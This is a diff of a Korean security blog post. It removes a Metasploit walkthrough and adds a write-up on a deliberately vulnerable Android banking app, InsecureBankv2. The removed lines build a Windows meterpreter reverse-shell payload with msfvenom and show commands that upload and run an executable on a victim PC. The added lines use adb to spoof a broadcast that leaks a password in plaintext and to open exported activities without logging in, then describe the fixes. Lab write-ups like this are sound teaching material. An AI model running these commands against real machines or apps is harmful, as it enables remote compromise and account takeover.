@@ -5,78 +5,80 @@ categories: MobileHacking
 tags: [Android, InsecureBank]
 ---
 # 목차
-1. Disclaimer
-1. Metasploit, msfvenom, meterpreter 란
-1. PoC
-1. 공격 코드 설명
+&nbsp;&nbsp;<a href="#{{ 1| downcase }}">1. Disclaimer</a><br>
+&nbsp;&nbsp;<a href="#{{ 2| downcase }}">2. 인시큐어뱅크(InsecureBankv2)란?</a><br>
+&nbsp;&nbsp;<a href="#{{ 3| downcase }}">3. 브로드캐스트 리시버 결함</a><br>
+&nbsp;&nbsp;<a href="#{{ 4| downcase }}">4. 취약한 인증 메커니즘</a><br>
+&nbsp;&nbsp;<a href="#{{ 5| downcase }}">5. 취약점 대응 방안</a><br>
+&nbsp;&nbsp;<a href="#{{ 6| downcase }}">6. References</a>
 - - -
-  
-# 1. Disclaimer
-<font color='red'>
-All the content shown in this post is only for educational purposes. Any misuse of this content is completely at your own risk.<br>
-Do not try to attempt to break laws or do any illegal stuff by using this.<br><br>
-
-이 포스트에서 보여지는 모든 컨텐츠는 교육적인 목적으로만 제작되었습니다. 해당 컨텐츠를 오용한 결과는 전적으로 오용한 본인 책임입니다.<br>
-이 포스트에서 다루는 내용을 이용해 불법적인 일을 저지르려고 하지 마십시오.
-</font>
+<h1 id="{{ 2| downcase }}">2. 인시큐어뱅크(InsecureBankv2)란?</h1>
+인시큐어뱅크는 모바일 뱅킹 취약점 진단을 위한 테스트 용도로 제작된 애플리케이션입니다. 안드로이드 모바일 개발자 및 보안 관리자를 위해 만들어졌으며, 백엔드 서버는 파이썬으로 제작되었습니다. 현재까지 총 23개의 취약점을 테스트할 수 있으며, 소스파일은 인시큐어 뱅크 깃허브 페이지에서 [다운로드](https://github.com/dineshshetty/Android-InsecureBankv2){:target="_blank"} 하실 수 있습니다.  
+(해당 포스트에서는 진단 환경 구성에 관한 내용을 생략했습니다.)
 - - -
-# 2. Metasploit, msfvenom, meterpreter 란
-## – Metasploit
-메타스플로잇 프로젝트란 취약점 분석과 IDS 서명 개발 보조기구 등에 대한 정보를 제공하는 것을 목적으로 하고 있습니다. 2007년 루비에 의하여 재구조된 후, 2009년 10월 21일 Rapid7이라는 통일 취약성 관리 솔루션을 제공하는 보안 회사에 인수되었습니다.
+<h1 id="{{ 3| downcase }}">3. 브로드캐스트 리시버 결함</h1>
+## – 소개
+브로드캐스트 리시버는 안드로이드의 4대 컴포넌트 중에 하나입니다. 브로드캐스트 리시버의 역할은 단말기 안에서 이루어지는 수 많은 일들을 대신해서 알려주는 것 입니다. 예를 들어, 배터리 부족, SMS 문자 메시지, 전화 알림 등의 방송(이벤트)를 캐치 후 리시버로 처리할 수 있도록 줍니다. “방송하기 -> 수신하기”가 하나의 사이클로 동작됩니다.  
 
-칼리 리눅스에 메타스플로잇이 기본으로 설치되어있고, 실제로 직접 metasploit-framework 의 모듈 폴더를 보면 탑재된 모듈이 루비로 작성되어있다는 것을 확인할 수 있습니다.
-
-
-메타스플로잇은 위와 같이 msfbinscan, msfconsole, msfd, msfdb, msfelfscan, msfmachscan, msfpescan, msfremove, msfrop, msfrpc, msfrpcd, msfupdate, msfvenom 이란 프로그램들로 구성되어 있습니다.  
-여기서 ~scan이란 이름의 프로그램들은 익스플로잇 도구를 제작할 때 쓰이는 도구이고, 대부분 메타스플로잇을 사용한다고 하면 msfconsole이란 콘솔 커맨드라인 인터페이스를 의미합니다. msfconsole은 메타스플로잇의 대부분의 기능을 지원합니다.
-
-## – msfvenom
-위의 프로그램 중에 msfvenom이란 이름의 프로그램이 있습니다. 메타스플로잇의 커맨드라인 인스턴스로써 다양한 쉘 코드를 생성할 수 있습니다.  
-예로, 공격자의 ip와 포트번호를 삽입하여 희생자 windows pc의 쉘을 따내는 프로그램을 제작하는데 사용됩니다.
-
-## – meterpreter
-메타스플로잇 공격은 주로 msfconsole -> search -> use -> info -> show options -> set -> exploit -> meterpreter 순으로 진행이 됩니다.  
-여기서 미터프리터는 in-memory DLL인젝션을 사용한 페이로드로써, 최종적으로 희생자 pc의 exploit에 성공해서 미터프리터 세션이 맺어져 쉘 권한을 획득해 직접 희생자 pc에 명령을 내릴 수 있게 네트워크를 유지시켜줍니다.
+브로드캐스트 리시버를 구현하기 위해서는 두 가지 방법이 존재합니다.  
+코드상에서 BroadCastReceiver를 등록하는 방법인 동적인 방법과 AndroidManifest.xml의 `<receiver></receiver>`의 형태로 등록하는 정적인 방법이 있습니다.
 - - -
-# PoC
-{% include youtube_embed.html id="G-3jJCqQ_m8" %}
+## – 취약점 진단 과정
+해당 취약점을 살펴보기에 앞서, .apk파일의 코드를 살펴보는 방법을 적어보겠습니다.
+
+
+.apk를 .zip파일로 확장자 변경을 하고 압축 해제하면 왼쪽과 같습니다. 이 중 classes.dex 파일을 .jar파일로 변환해서 애플리케이션의 코드를 살펴볼 수 있습니다.
+
+
+
+[dex2jar](https://github.com/pxb1988/dex2jar){:target="_blank"}는 APK파일이나 APK파일에 포함된 classes.dex 파일을 자바 클래스 파일로 변환해주는 도구입니다. .jar파일을 [jd-gui](http://java-decompiler.github.io/#jd-gui-download){:target="_blank"}로 열어보면 아래와 같이 자바 패키지 파일들과 메서드들을 확인해볼 수 있습니다.
 - - -
-# 4. 공격 코드 설명
+.apk를 .zip으로 변환하여 압축 해제한 파일들 중에서 AndroidManifest.xml 파일을 살펴보겠습니다. 리시버 선언 부분에 해당하는 xml 코드는 다음과 같습니다.
+
+
+여기에 선언된 브로드캐스트의 이름은 theBroadcast이며, 브로드캐스트 신호를 받으면 MyBroadCastReceiver에 설정된 작업을 수행합니다. 그리고 exported값이 true로 되어 있기 때문에 외부 애플리케이션으로부터 intent를 받을 수 있는 상태 입니다.
+- - -
+ADB 쉘 명령을 이용하여 임의의 브로드캐스트를 생성, 리시버를 속이는 작업을 해보겠습니다. 여기서 ADB(Android Debug Bridge)란 안드로이드 에뮬레이터나 PC에 실제 연결된 장치를 제어하기 위한 안드로이드 디버깅 도구 중 하나 입니다. ADB 쉘 명령어 중 am 명령어는 액티비티 매니저로써, 이것을 사용하면 안드로이드 시스템에 포함된 다양한 액션을 명령으로 수행할 수 있습니다.
+
+ADB를 이용하여 확인하는 명령어는 다음과 같습니다 :
 {% highlight text %}
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.xxx.xxx LPORT=7777 -f exe -o clickme.exe
+adb shell am start [앱이 설치된 주소]/[호출하고 싶은 패키지 주소]
 {% endhighlight %}
-msfvenom을 이용해 페이로드(-p)로 윈도우즈 미터프리터 리버스 커넥션을 맺습니다. 여기서 리버스 커넥션이란, 외부에서 내부로 들어오는 inbound 트래픽은 방화벽에서 막지만, 그 반대인 outbound 트래픽의 경우 대부분은 허용해주는 것을 이용해 내부망에서 외부망으로 거꾸로 접속을 하도록하는 쉘코드를 의미합니다.  
-LHOST는 공격자 아이피이고 LPORT는 공격자 임의의 포트로 설정합니다.  
-포맷(-f)은 exe로 윈도우즈 실행 프로그램이며, clickme.exe 형태로 페이로드를 저장합니다.
+phonenumber와 newpass 값을 포함하여 브로드캐스트를 생성합니다.
+–es 옵션을 이용하여 변수와 함께 값을 추가합니다.
 
 {% highlight text %}
-msf5 > use exploit/multi/handler
+> adb shell broadcast -a theBroadcast -n com.android.insecurebankv2/.MyBroadCastReceiver --es phonenumber 5555 --es newpass test
 {% endhighlight %}
-{% highlight text %}
-msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
-{% endhighlight %}
-{% highlight text %}
-msf5 exploit(multi/handler) > set lhost 192.168.xxx.xxx
-{% endhighlight %}
-{% highlight text %}
-msf5 exploit(multi/handler) > set lport 7777
-{% endhighlight %}
-{% highlight text %}
-msf5 exploit(multi/handler) > exploit
-{% endhighlight %}
-익스플로잇을 하고 희생자 pc에서 clickme.exe를 클릭하면 리버스 커넥션이 맺어졌다는 메시지와 함께 미터프리터 세션이 열렸다는 메시지를 받게 됩니다.
 
+logcat을 이용해 로그를 확인해봅니다.
 {% highlight text %}
-meterpreter > sysinfo
+> adb logcat > log01.txt
 {% endhighlight %}
-미터프리터 세션을 이용해 희생자 pc의 시스템 정보를 알아냅니다.
 
-{% highlight text %}
-meterpreter > upload Warning.exe
-{% endhighlight %}
-Warning.exe라는, 공격자가 만들어낸 윈도우즈 실행파일을 희생자 pc에 업로드 시킵니다.
+logcat 정보를 확인해보시면 기존에 사용했던 비밀번호가 평문으로 보여짐을 확인할 수 있습니다(계정의 비밀번호는 변경되지 않습니다).
+- - -
+<h1 id="{{ 4| downcase }}">4. 취약한 인증 매커니즘</h1>
+## – 소개
+취약한 인증 매커니즘은 정상적인 인증 절차를 우회하여 잘못된(비정상적인) 인증으로 접근 권한을 취득하는 취약점을 말합니다.
+- - -
+## – 취약점 진단 과정
+AndroidManifest.xml 코드의 안드로이드 액티비티 속성이 android:exported=”true”로 설정되어 있다는 것을 알 수 있습니다.
 
+
+인시큐어 뱅크에 ADB 쉘을 이용해 액티비티를 호출하는 명령어 입니다.
 {% highlight text %}
-meterpreter > execute -f Warning.exe
+> adb shell am start com.android.insecurebankv2/com.android.insecurebankv2.PostLogin
+> adb shell am start com.android.insecurebankv2/com.android.insecurebankv2.DoTransfer
 {% endhighlight %}
-공격자가 임의로 Warning.exe를 실행시킵니다.
+위 명령어를 입력했을 때 실제 애플리케이션에서 별도의 인증 절차 없이 해당 액티비티가 직접 호출됨을 확인할 수 있었습니다.
+
+<blockquote class="imgur-embed-pub" lang="en" data-id="ZKj6PGI"><a href="//imgur.com/ZKj6PGI"></a></blockquote><script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script>
+- - -
+<h1 id="{{ 5| downcase }}">5. 취약점 대응 방안</h1>
+AndroidManifest.xml 리시버와 액티비티 항목에 위치하는 android:exported=”true”항목을 “false”로 바꿔주어야 합니다.
+
+android:exported=”true”로 설정해야 하는 경우, 각 리시버에 별도의 권한을 주어야 하며 별도의 인텐트 필터로 검증해야 합니다.
+- - -
+<h1 id="{{ 6| downcase }}">6. References</h1>
+&#91;안드로이드 모바일 앱 모의해킹&#93; / 조정원, 김명근, 조승현, 류진영, 김광수 지음 / 에이콘 출판사
